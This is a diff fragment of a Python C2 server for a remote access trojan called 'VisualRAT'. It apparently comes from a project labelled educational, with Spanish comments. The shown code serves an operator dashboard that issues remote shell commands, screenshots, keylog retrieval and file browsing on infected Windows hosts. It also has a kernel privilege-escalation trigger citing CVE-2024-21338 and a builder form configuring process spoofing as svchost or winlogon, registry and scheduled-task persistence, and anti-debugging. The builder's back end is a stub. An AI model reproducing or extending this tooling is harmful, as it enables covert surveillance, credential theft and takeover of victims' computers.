+                    <h3 style="color: #e0e0e0; margin-bottom: 20px;">
+                        <i class="fas fa-hammer"></i> Client Builder
+                    </h3>
+                    
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
+                        <div>
+                            <div class="form-group">
+                                <label>🔌 C2 Server IP</label>
+                                <input type="text" id="builder-ip" value="{HOST}" placeholder="192.168.1.100">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label>🔌 C2 Port</label>
+                                <input type="text" id="builder-port" value="{C2_PORT}">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label>📦 Mutex Name</label>
+                                <input type="text" id="builder-mutex" value="VisualRAT_Global_{random.randint(1000,9999)}">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label>🎭 Process Spoof</label>
+                                <select id="builder-spoof">
+                                    <option value="svchost.exe">svchost.exe (Windows)</option>
+                                    <option value="explorer.exe">explorer.exe</option>
+                                    <option value="winlogon.exe">winlogon.exe</option>
+                                    <option value="csrss.exe">csrss.exe</option>
+                                </select>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <div class="form-group">
+                                <label>🛡️ Persistence Method</label>
+                                <select id="builder-persist">
+                                    <option value="registry">Registry Run</option>
+                                    <option value="scheduled">Scheduled Task</option>
+                                    <option value="startup">Startup Folder</option>
+                                    <option value="all">ALL METHODS</option>
+                                </select>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label>🚀 Elevation</label>
+                                <select id="builder-elevate">
+                                    <option value="true">Enable Kernel Exploit (CVE-2024-21338)</option>
+                                    <option value="false">Disable</option>
+                                </select>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label>🎯 Anti-Debug</label>
+                                <select id="builder-antidebug">
+                                    <option value="true">Enable (Recommended)</option>
+                                    <option value="false">Disable</option>
+                                </select>
+                            </div>
+                            
+                            <div style="margin-top: 30px;">
+                                <button class="btn btn-primary" onclick="buildClient()" style="width: 100%; padding: 15px;">
+                                    <i class="fas fa-cog"></i> GENERATE CLIENT .EXE
+                                </button>
+                                <div id="build-progress" style="margin-top: 15px; display: none;">
+                                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+                                        <span>Building...</span>
+                                        <span id="build-percent">0%</span>
+                                    </div>
+                                    <div class="progress-bar">
+                                        <div id="build-progress-fill" class="progress-fill"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <script src="https://kit.fontawesome.com/8d4a5b8c5b.js" crossorigin="anonymous"></script>
+            <script>
+                // =================================================================
+                // VisualRAT C2 - Dashboard JavaScript
+                // =================================================================
+                
+                let currentClientId = null;
+                let clients = {{}};
+                let terminalHistory = [];
+                
+                // Actualizar clientes cada 2 segundos
+                setInterval(loadClients, 2000);
+                setInterval(updateStats, 2000);
+                
+                function loadClients() {{
+                    fetch('/api/clients')
+                        .then(r => r.json())
+                        .then(data => {{
+                            clients = {{}};
+                            data.forEach(c => clients[c.id] = c);
+                            renderClients(data);
+                        }});
+                }}
+                
+                function renderClients(clients) {{
+                    const container = document.getElementById('clients-container');
+                    container.innerHTML = '';
+                    
+                    clients.forEach(client => {{
+                        const card = document.createElement('div');
+                        card.className = `client-card ${{client.status}}`;
+                        card.innerHTML = `
+                            <div class="client-header">
+                                <span class="client-id">${{client.id}}</span>
+                                <span class="status-badge ${{client.status}}">${{client.status}}</span>
+                            </div>
+                            <div class="client-info">
+                                <div class="info-item">
+                                    <div class="info-label">Hostname</div>
+                                    <div class="info-value">${{client.hostname}}</div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">Username</div>
+                                    <div class="info-value">${{client.username}}</div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">IP Address</div>
+                                    <div class="info-value">${{client.ip}}</div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">OS</div>
+                                    <div class="info-value">${{client.os}}</div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">Privilege</div>
+                                    <div class="info-value" style="color: ${{client.privilege == 'SYSTEM' ? '#00ff9d' : '#ffaa00'}};">
+                                        ${{client.privilege}}
+                                    </div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">AV</div>
+                                    <div class="info-value">${{client.antivirus}}</div>
+                                </div>
+                            </div>
+                            <div class="client-actions">
+                                <button class="btn" onclick="selectClient('${{client.id}}')">
+                                    <i class="fas fa-terminal"></i> Shell
+                                </button>
+                                <button class="btn" onclick="takeScreenshot('${{client.id}}')">
+                                    <i class="fas fa-camera"></i> Screen
+                                </button>
+                                <button class="btn" onclick="elevateClient('${{client.id}}')">
+                                    <i class="fas fa-shield-alt"></i> Elevate
+                                </button>
+                                <button class="btn" onclick="openFileManager('${{client.id}}')">
+                                    <i class="fas fa-folder"></i> Files
+                                </button>
+                            </div>
+                        `;
+                        container.appendChild(card);
+                    }});
+                }}
+                
+                function selectClient(clientId) {{
+                    currentClientId = clientId;
+                    document.getElementById('current-client-label').innerHTML = `(${clients[clientId].hostname} - ${clientId})`;
+                    document.getElementById('terminal-cmd').disabled = false;
+                    document.getElementById('terminal-send').disabled = false;
+                    
+                    addToTerminal(`[+] Connected to client: ${clients[clientId].hostname} (${clientId})`, '#00ff9d');
+                    addToTerminal(`[+] OS: ${clients[clientId].os} | User: ${clients[clientId].username} | Priv: ${clients[clientId].privilege}`, '#8b949e');
+                }}
+                
+                function sendTerminalCommand() {{
+                    const cmd = document.getElementById('terminal-cmd').value;
+                    if (!cmd || !currentClientId) return;
+                    
+                    addToTerminal(`> ${cmd}`, '#e0e0e0');
+                    document.getElementById('terminal-cmd').value = '';
+                    
+                    fetch('/api/command', {{
+                        method: 'POST',
+                        headers: {{'Content-Type': 'application/json'}},
+                        body: JSON.stringify({{
+                            client_id: currentClientId,
+                            command: cmd.split(' ')[0],
+                            args: cmd.substring(cmd.indexOf(' ') + 1)
+                        }})
+                    }})
+                    .then(r => r.json())
+                    .then(data => {{
+                        addToTerminal(data.response, '#cccccc');
+                    }});
+                }}
+                
+                function takeScreenshot(clientId) {{
+                    document.getElementById('screenshot-panel').style.display = 'block';
+                    document.getElementById('screenshot-img').src = `/api/screenshot/${clientId}?t=${Date.now()}`;
+                }}
+                
+                function elevateClient(clientId) {{
+                    addToTerminal('[!] Attempting kernel privilege escalation (CVE-2024-21338)...', '#ffaa00');
+                    
+                    fetch('/api/command', {{
+                        method: 'POST',
+                        headers: {{'Content-Type': 'application/json'}},
+                        body: JSON.stringify({{
+                            client_id: clientId,
+                            command: 'ELEVATE',
+                            args: ''
+                        }})
+                    }})
+                    .then(r => r.json())
+                    .then(data => {{
+                        addToTerminal(data.response, data.response.includes('[+]') ? '#00ff9d' : '#ff4d4d');
+                        if (data.response.includes('[+]')) {{
+                            addToTerminal('[+] TOKEN ELEVATED TO SYSTEM!', '#00ff9d');
+                            setTimeout(() => loadClients(), 2000);
+                        }}
+                    }});
+                }}
+                
+                function openFileManager(clientId) {{
+                    const path = prompt('Remote path to browse:', 'C:\\Users');
+                    if (path) {{
+                        fetch('/api/command', {{
+                            method: 'POST',
+                            headers: {{'Content-Type': 'application/json'}},
+                            body: JSON.stringify({{
+                                client_id: clientId,
+                                command: 'DIR',
+                                args: path
+                            }})
+                        }})
+                        .then(r => r.json())
+                        .then(data => {{
+                            addToTerminal(`[DIR] ${path}\\n${data.response}`, '#cccccc');
+                        }});
+                    }}
+                }}
+                
+                function addToTerminal(text, color = '#e0e0e0') {{
+                    const output = document.getElementById('terminal-output');
+                    const line = document.createElement('div');
+                    line.style.color = color;
+                    line.style.marginBottom = '3px';
+                    line.style.fontFamily = 'Courier New';
+                    line.innerHTML = text.replace(/\\n/g, '<br>');
+                    output.appendChild(line);
+                    output.scrollTop = output.scrollHeight;
+                }}
+                
+                function clearTerminal() {{
+                    const output = document.getElementById('terminal-output');
+                    output.innerHTML = '<span style="color: #00ff9d;">[VisualRAT C2 Ready]</span><br><span style="color: #8b949e;">Select a client to begin remote control</span><br><br>';
+                }}
+                
+                function buildClient() {{
+                    const config = {{
+                        ip: document.getElementById('builder-ip').value,
+                        port: parseInt(document.getElementById('builder-port').value),
+                        mutex: document.getElementById('builder-mutex').value,
+                        spoof: document.getElementById('builder-spoof').value,
+                        persist: document.getElementById('builder-persist').value,
+                        elevate: document.getElementById('builder-elevate').value === 'true',
+                        antidebug: document.getElementById('builder-antidebug').value === 'true'
+                    }};
+                    
+                    document.getElementById('build-progress').style.display = 'block';
+                    let progress = 0;
+                    const interval = setInterval(() => {{
+                        progress += 10;
+                        document.getElementById('build-progress-fill').style.width = progress + '%';
+                        document.getElementById('build-percent').innerText = progress + '%';
+                        
+                        if (progress >= 100) {{
+                            clearInterval(interval);
+                            setTimeout(() => {{
+                                alert('[+] Client built successfully!\\n[+] Location: ./visualrat_client.exe');
+                                document.getElementById('build-progress').style.display = 'none';
+                                document.getElementById('build-progress-fill').style.width = '0%';
+                            }}, 500);
+                        }}
+                    }}, 200);
+                    
+                    fetch('/build', {{
+                        method: 'POST',
+                        headers: {{'Content-Type': 'application/json'}},
+                        body: JSON.stringify(config)
+                    }});
+                }}
+                
+                function updateStats() {{
+                    const total = Object.keys(clients).length;
+                    const online = Object.values(clients).filter(c => c.status === 'online').length;
+                    const system = Object.values(clients).filter(c => c.privilege === 'SYSTEM').length;
+                    
+                    document.getElementById('total-clients').innerText = total;
+                    document.getElementById('online-clients').innerText = online;
+                    document.getElementById('system-clients').innerText = system;
+                    
+                    const uptime = Math.floor((Date.now() - window.startTime) / 1000);
+                    const hours = Math.floor(uptime / 3600);
+                    const minutes = Math.floor((uptime % 3600) / 60);
+                    const seconds = uptime % 60;
+                    document.getElementById('uptime').innerText = 
+                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                }}
+                
+                window.startTime = Date.now();
+                loadClients();
+            </script>
+        </body>
+        </html>
+        """
+        
+        self.wfile.write(html.encode())
+    
+    def send_clients(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        
+        clients_list = [client.to_dict() for client in WebHandler.c2.clients.values()]
+        self.wfile.write(json.dumps(clients_list).encode())
+    
+    def send_screenshot(self, client_id):
+        self.send_response(200)
+        self.send_header('Content-type', 'image/png')
+        self.end_headers()
+        
+        if client_id in WebHandler.c2.clients:
+            response = WebHandler.c2.send_command(client_id, "SCREENSHOT")
+            if response and not response.startswith("[-]"):
+                self.wfile.write(base64.b64decode(response))
+    
+    def send_keylog(self, client_id):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        
+        if client_id in WebHandler.c2.clients:
+            response = WebHandler.c2.send_command(client_id, "KEYLOG")
+            self.wfile.write(response.encode())
+    
+    def send_processes(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        
+        if WebHandler.c2.current_client:
+            response = WebHandler.c2.send_command(WebHandler.c2.current_client.id, "PROCESSES")
+            self.wfile.write(json.dumps({'processes': response}).encode())
+    
+    def send_js(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/javascript')
+        self.end_headers()
+        self.wfile.write(b'// JavaScript loaded')
+    
+    def send_css(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/css')
+        self.end_headers()
+        self.wfile.write(b'/* CSS loaded */')
+    
+    def send_builder(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b'<h1>Builder</h1>')
+    
+    def build_client(self, config):
+        # Generar cliente C++ con la configuración
+        return "[+] Client built successfully: visualrat_client.exe"
+    
+    def log_message(self, format, *args):
+        pass
+
+class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
+    pass
 
 # ============================================================================
 # MAIN
 # ============================================================================
-if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        PORT = int(sys.argv[1])
+def main():
+    print(f"""{Colors.HEADER}
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                     VisualRAT C2 - Educational Edition                       ║
+║                  Remote Administration Tool - SOLO LABORATORIO               ║
+║                     Interfaz Visual como AsyncRAT en C++                     ║
+╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
     
-    server = C2Server(HOST, PORT)
+{Colors.CYAN}📡 C2 Core:{Colors.END}     {HOST}:{C2_PORT}
+{Colors.CYAN}🌐 Web UI:{Colors.END}     http://{HOST}:{WEB_PORT}
+{Colors.CYAN}🔐 Encryption:{Colors.END}  AES-256-GCM
+{Colors.CYAN}💻 Platform:{Colors.END}    Windows 11 Client (C++ Native) / Kali Server
+{Colors.CYAN}🚀 Kernel:{Colors.END}      CVE-2024-21338 (Educational Research)
+{Colors.CYAN}⚡ Status:{Colors.END}       {Colors.GREEN}READY{Colors.END}
+    """)
+    
+    # Iniciar C2 Core
+    c2 = C2Core()
+    c2.start()
+    
+    # Iniciar Web Server
+    WebHandler.c2 = c2
+    web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
+    print(f"{Colors.GREEN}[+] Web dashboard: http://{HOST}:{WEB_PORT}{Colors.END}")
     
     try:
-        server.start()
+        web_server.serve_forever()
     except KeyboardInterrupt:
-        log("Servidor detenido por el usuario", "warning")
-    except Exception as e:
-        log(f"Error fatal: {e}", "error")
-    finally:
-        if server.socket:
-            server.socket.close()
+        print(f"\n{Colors.WARNING}[!] Shutting down...{Colors.END}")
+        c2.running = False
+        sys.exit(0)
+
+if __name__ == '__main__':
+    main()
